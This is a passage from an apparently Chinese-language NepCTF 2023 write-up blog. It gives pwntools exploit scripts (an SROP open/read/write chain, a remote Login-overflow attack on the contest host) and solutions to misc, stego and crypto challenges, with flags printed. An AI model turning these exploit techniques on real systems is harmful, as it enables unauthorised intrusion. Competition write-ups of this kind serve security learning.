punctuation">.</span>rdx <span class="token operator">=</span> buf<span class="token comment" spellcheck="true">#rsi</span>frame4<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallframe4<span class="token punctuation">.</span>rsp <span class="token operator">=</span> buf<span class="token comment" spellcheck="true">#+len(sigreturn+bytes(sigframe))  # 设置栈顶指针位置</span>stack3 <span class="token operator">=</span> sigreturn<span class="token operator">+</span>bytes<span class="token punctuation">(</span>frame4<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#open</span>frame2 <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span>kernel<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>frame2<span class="token punctuation">.</span>rdi <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_open<span class="token comment" spellcheck="true">#rax</span>frame2<span class="token punctuation">.</span>rcx <span class="token operator">=</span> <span class="token number">0</span><span class="token comment" spellcheck="true">#rdx</span>frame2<span class="token punctuation">.</span>rsi <span class="token operator">=</span> buf<span class="token comment" spellcheck="true">#rdi注意这里是不能直接传字符串"flag"的，而是应该传地址</span>frame2<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallframe2<span class="token punctuation">.</span>rsp <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">5</span><span class="token operator">+</span>len<span class="token punctuation">(</span>sigreturn<span class="token operator">+</span>bytes<span class="token punctuation">(</span>frame2<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 设置栈顶指针位置</span>stack1 <span class="token operator">=</span> sigreturn<span class="token operator">+</span>bytes<span class="token punctuation">(</span>frame2<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#read2</span>frame3 <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span>kernel<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>frame3<span class="token punctuation">.</span>rdi <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_read<span class="token comment" spellcheck="true">#rax</span>frame3<span class="token punctuation">.</span>rcx <span class="token operator">=</span> <span class="token number">0x40</span><span class="token comment" spellcheck="true">#rdx</span>frame3<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">3</span><span class="token comment" spellcheck="true">#rdi</span>frame3<span class="token punctuation">.</span>rdx <span class="token operator">=</span> buf<span class="token comment" spellcheck="true">#rsi</span>frame3<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallframe3<span class="token punctuation">.</span>rsp <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">5</span><span class="token operator">+</span>len<span class="token punctuation">(</span>stack1<span class="token operator">+</span>sigreturn<span class="token operator">+</span>bytes<span class="token punctuation">(</span>frame3<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 设置栈顶指针位置</span>stack2 <span class="token operator">=</span> sigreturn<span class="token operator">+</span>bytes<span class="token punctuation">(</span>frame3<span class="token punctuation">)</span>stack_frame <span class="token operator">=</span> b<span class="token string">"flag\x00"</span><span class="token operator">+</span>stack1<span class="token operator">+</span>stack2<span class="token operator">+</span>stack3<span class="token comment" spellcheck="true">#stack_frame = sigreturn+bytes(sigframe)+sigreturn+bytes(sframe)</span><span class="token comment" spellcheck="true">#read1</span>frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span>kernel<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_read<span class="token comment" spellcheck="true">#rax</span>frame<span class="token punctuation">.</span>rcx <span class="token operator">=</span> len<span class="token punctuation">(</span>stack_frame<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#rdx</span>frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span><span class="token comment" spellcheck="true">#rdi</span>frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> buf<span class="token comment" spellcheck="true">#rsi</span>frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">5</span>  <span class="token comment" spellcheck="true"># 设置栈顶指针位置</span><span class="token keyword">print</span><span class="token punctuation">(</span>bytes<span class="token punctuation">(</span>frame<span class="token punctuation">)</span><span class="token punctuation">)</span>pad <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span>pad <span class="token operator">+=</span> sigreturn <span class="token operator">+</span> bytes<span class="token punctuation">(</span>frame<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>pad<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pause(1)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>stack_frame<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140041407.png" alt="image-20230814004138378"></p><p>可恶的Login找不出路径……</p><h2 id="HRP-CHAT-2"><a href="#HRP-CHAT-2" class="headerlink" title="HRP-CHAT-2"></a>HRP-CHAT-2</h2><p>真的服了….真的就差一步，下标没弄清楚，其实一个个试都可以试出来的….</p><p>获得攻击力最高的角色（需要抽卡得到，抽卡的次数会影响你的下标）</p><p>选择攻击力最强的技能，击败boss即可拿到flag</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308151840502.png" alt="image-20230815135736939"></p><h2 id="HRP-CHAT-3"><a href="#HRP-CHAT-3" class="headerlink" title="HRP-CHAT-3"></a>HRP-CHAT-3</h2><p>阅读源码</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308151840711.png" alt="image-20230815141853615"></p><p>main函数里执行子进程，崩溃进入CMD</p><p>CMD函数</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401311024744.png" alt="image-20230815141945133"></p><p>可以想到让子进程崩溃后，进入安全模式拿flag</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#context(os='linux', arch='amd64', log_level='debug')</span><span class="token comment" spellcheck="true">#context.terminal = ['tmux', 'splitw', '-h']</span><span class="token comment" spellcheck="true">#p = process("./")</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'nepctf.1cepeak.cn'</span><span class="token punctuation">,</span><span class="token number">31971</span><span class="token punctuation">)</span>sda <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span>data<span class="token punctuation">)</span>sd <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sea <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span>data<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span>data<span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span> <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span>drop<span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_addr64</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">return</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_addr32</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">return</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span>b<span class="token string">'help'</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>b<span class="token string">'Login\n'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'6'</span><span class="token punctuation">,</span>b<span class="token string">'Login\n'</span><span class="token operator">*</span><span class="token number">0x517</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>b<span class="token string">'\nSafe_Mode_Key'</span><span class="token punctuation">)</span>ia<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308151840784.png" alt="image-20230815143957697"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>一个号只能发一次，第一次发错了….（哭）</p><p>NepCTF{H4ve_Fun_1N_This_Game}</p><h2 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a><strong>与AI共舞的哈夫曼</strong></h2><p>年轻人就要年轻，正经人谁自己做题啊~x</p><p>GPT秒了</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140017820.png" alt="image-20230814001753757"></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> heapq<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">HuffmanNode</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> char<span class="token punctuation">,</span> freq<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>char <span class="token operator">=</span> char        self<span class="token punctuation">.</span>freq <span class="token operator">=</span> freq        self<span class="token punctuation">.</span>left <span class="token operator">=</span> None        self<span class="token punctuation">.</span>right <span class="token operator">=</span> None    <span class="token keyword">def</span> <span class="token function">__lt__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> other<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>freq <span class="token operator">&lt;</span> other<span class="token punctuation">.</span>freq<span class="token keyword">def</span> <span class="token function">build_huffman_tree</span><span class="token punctuation">(</span>frequencies<span class="token punctuation">)</span><span class="token punctuation">:</span>    heap <span class="token operator">=</span> <span class="token punctuation">[</span>HuffmanNode<span class="token punctuation">(</span>char<span class="token punctuation">,</span> freq<span class="token punctuation">)</span> <span class="token keyword">for</span> char<span class="token punctuation">,</span> freq <span class="token keyword">in</span> frequencies<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    heapq<span class="token punctuation">.</span>heapify<span class="token punctuation">(</span>heap<span class="token punctuation">)</span>    <span class="token keyword">while</span> len<span class="token punctuation">(</span>heap<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>        left <span class="token operator">=</span> heapq<span class="token punctuation">.</span>heappop<span class="token punctuation">(</span>heap<span class="token punctuation">)</span>        right <span class="token operator">=</span> heapq<span class="token punctuation">.</span>heappop<span class="token punctuation">(</span>heap<span class="token punctuation">)</span>        merged <span class="token operator">=</span> HuffmanNode<span class="token punctuation">(</span>None<span class="token punctuation">,</span> left<span class="token punctuation">.</span>freq <span class="token operator">+</span> right<span class="token punctuation">.</span>freq<span class="token punctuation">)</span>        merged<span class="token punctuation">.</span>left <span class="token operator">=</span> left        merged<span class="token punctuation">.</span>right <span class="token operator">=</span> right        heapq<span class="token punctuation">.</span>heappush<span class="token punctuation">(</span>heap<span class="token punctuation">,</span> merged<span class="token punctuation">)</span>    <span class="token keyword">return</span> heap<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">build_huffman_codes</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> current_code<span class="token punctuation">,</span> huffman_codes<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> node <span class="token keyword">is</span> None<span class="token punctuation">:</span>        <span class="token keyword">return</span>    <span class="token keyword">if</span> node<span class="token punctuation">.</span>char <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>        huffman_codes<span class="token punctuation">[</span>node<span class="token punctuation">.</span>char<span class="token punctuation">]</span> <span class="token operator">=</span> current_code        <span class="token keyword">return</span>    build_huffman_codes<span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token punctuation">,</span> current_code <span class="token operator">+</span> <span class="token string">'0'</span><span class="token punctuation">,</span> huffman_codes<span class="token punctuation">)</span>    build_huffman_codes<span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token punctuation">,</span> current_code <span class="token operator">+</span> <span class="token string">'1'</span><span class="token punctuation">,</span> huffman_codes<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compress</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> output_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    frequencies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">for</span> byte <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">if</span> byte <span class="token operator">not</span> <span class="token keyword">in</span> frequencies<span class="token punctuation">:</span>            frequencies<span class="token punctuation">[</span>byte<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        frequencies<span class="token punctuation">[</span>byte<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>    root <span class="token operator">=</span> build_huffman_tree<span class="token punctuation">(</span>frequencies<span class="token punctuation">)</span>    huffman_codes <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    build_huffman_codes<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> huffman_codes<span class="token punctuation">)</span>    compressed_data <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> byte <span class="token keyword">in</span> data<span class="token punctuation">:</span>        compressed_data <span class="token operator">+=</span> huffman_codes<span class="token punctuation">[</span>byte<span class="token punctuation">]</span>    padding <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>compressed_data<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span>    compressed_data <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token operator">*</span> padding    <span class="token keyword">with</span> open<span class="token punctuation">(</span>output_file<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># Write frequency information</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>bytes<span class="token punctuation">(</span><span class="token punctuation">[</span>len<span class="token punctuation">(</span>frequencies<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> byte<span class="token punctuation">,</span> freq <span class="token keyword">in</span> frequencies<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>bytes<span class="token punctuation">(</span><span class="token punctuation">[</span>byte<span class="token punctuation">,</span> <span class="token punctuation">(</span>freq <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>freq <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>freq <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> freq <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Write compressed data</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>compressed_data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            byte <span class="token operator">=</span> compressed_data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>bytes<span class="token punctuation">(</span><span class="token punctuation">[</span>int<span class="token punctuation">(</span>byte<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decompress</span><span class="token punctuation">(</span>compressed_file<span class="token punctuation">,</span> decompressed_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>compressed_file<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 读取频率信息</span>        num_symbols <span class="token operator">=</span> int<span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span>        frequencies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span>num_symbols<span class="token punctuation">)</span><span class="token punctuation">:</span>            byte<span class="token punctuation">,</span> freq1<span class="token punctuation">,</span> freq2<span class="token punctuation">,</span> freq3<span class="token punctuation">,</span> freq4 <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>            freq <span class="token operator">=</span> <span class="token punctuation">(</span>freq1 <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>freq2 <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>freq3 <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> freq4            frequencies<span class="token punctuation">[</span>byte<span class="token punctuation">]</span> <span class="token operator">=</span> freq        <span class="token comment" spellcheck="true"># 构建哈夫曼树</span>        root <span class="token operator">=</span> build_huffman_tree<span class="token punctuation">(</span>frequencies<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 解压缩数据</span>        current_node <span class="token operator">=</span> root        decompressed_data <span class="token operator">=</span> bytearray<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            bit <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> bit<span class="token punctuation">:</span>                <span class="token keyword">break</span>            bit <span class="token operator">=</span> int<span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>bit<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> current_node<span class="token punctuation">.</span>char <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>                    decompressed_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current_node<span class="token punctuation">.</span>char<span class="token punctuation">)</span>                    current_node <span class="token operator">=</span> root                <span class="token keyword">if</span> <span class="token punctuation">(</span>bit <span class="token operator">>></span> i<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                    current_node <span class="token operator">=</span> current_node<span class="token punctuation">.</span>right                <span class="token keyword">else</span><span class="token punctuation">:</span>                    current_node <span class="token operator">=</span> current_node<span class="token punctuation">.</span>left        <span class="token comment" spellcheck="true"># 写入解压缩后的数据</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span>decompressed_file<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> output_f<span class="token punctuation">:</span>            output_f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>decompressed_data<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    input_file <span class="token operator">=</span> <span class="token string">'input.txt'</span>    compressed_file <span class="token operator">=</span> <span class="token string">'compressed.bin'</span>    decompressed_file <span class="token operator">=</span> <span class="token string">'decompressed.txt'</span>    <span class="token comment" spellcheck="true"># 解压缩文件</span>    decompress<span class="token punctuation">(</span>compressed_file<span class="token punctuation">,</span> decompressed_file<span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308141025369.png" alt="image-20230814101049586"></p><h2 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h2><p>各种尝试想要提权结果没一个函数有用的，system,getenv,mprotect甚至read甚至env本身全都禁掉了</p><p>只好直接输出，想到函数参数依次入栈，而env环境变量也是main函数的一个参数，从而想到在argc的基础上++移动指针，暴力输出大量数据，从中找到flag</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span> <span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">for</span> （<span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">700</span><span class="token punctuation">;</span><span class="token operator">++</span>j<span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d': %s n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> argv［ i 」 <span class="token operator">+</span> j <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><del>（优雅）</del></p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308151126222.png" alt="image-20230814002546260"></p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140026993.png" alt="image-20230814002608949"></p><h2 id="小叮弹钢琴"><a href="#小叮弹钢琴" class="headerlink" title="小叮弹钢琴"></a>小叮弹钢琴</h2><p>mid音频隐写（我思考velato这样的音符编程语言尝试了好久最后发现就是个隐写？？）</p><p>前半段是短音符和长音符，判断是摩斯电码，后面的是一串十六进制数字</p><p>摩斯电码解码得到tip：youshouldusethistoxorsomething</p><p>真，一开始断句成了this tox or something （甚至找了半天tox是啥）</p><p>接下来异或卡了好久，愣是没想到是用这句话去异或</p><p>之后联想前几个字母是NepCTF，尝试发现与之异或的是you，才发现把youshouldusethistoxorsomething这句话去异或0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17就行了</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140038661.png" alt="image-20230814003810621"></p><h2 id="陌生的语言"><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h2><p>由给出的hint可知是小魔女学园的月文和龙语。</p><p>纯粹的信息收集了</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140038297.jpg"></p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308141000511.jpg" alt="img"></p><p>NepCTF{NEPNEP_A_BELIEVING_Heart_is_your_magic}</p><h2 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h2><p>真的是下棋下出来的</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140050622.png" alt="image-20230814005007869"></p><h2 id="你也喜欢三月七么"><a href="#你也喜欢三月七么" class="headerlink" title="你也喜欢三月七么"></a>你也喜欢三月七么</h2><p>题目所给附件</p><pre class=" language-python"><code class="language-python">salt_lenth<span class="token operator">=</span> <span class="token number">10</span> key_lenth<span class="token operator">=</span> <span class="token number">16</span> iv<span class="token operator">=</span> <span class="token number">88219bdee9c396eca3c637c0ea436058</span> <span class="token comment" spellcheck="true">#原始iv转hex的值</span>ciphertext<span class="token operator">=</span> b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</code></pre><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308292027548.png" alt="image-20230829202743433"></p><p>看上去是AES，根据题目：</p><p>salt=NepCTF2023</p><p>salt用sha256加密后得到key，解得sha256（salt）= dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009</p><p>截取前十六位为key</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AESkey <span class="token operator">=</span> <span class="token string">'dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009'</span>iv_hex <span class="token operator">=</span> <span class="token string">'88219bdee9c396eca3c637c0ea436058'</span> <span class="token comment" spellcheck="true">#原始iv转hex的值</span>ciphertext<span class="token operator">=</span> <span class="token triple-quoted-string 